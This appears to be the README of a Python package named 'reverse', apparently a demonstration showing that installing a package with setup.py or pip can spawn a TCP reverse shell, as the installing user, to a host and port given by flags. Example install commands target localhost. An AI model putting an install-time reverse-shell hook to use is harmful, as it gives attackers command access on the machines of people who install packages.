pip in peace - reverse
======================

The reverse package spawns a tcp reverse shell as the user running the install to the host and the port specified by the `--host` and `--port` flags.

setup.py
--------

```
    python3 setup.py install --host=127.0.0.1 --port=12345
```

pip
---

```
    pip3 install . --install-option='--host=127.0.0.1' --install-option='--port=12345'
```
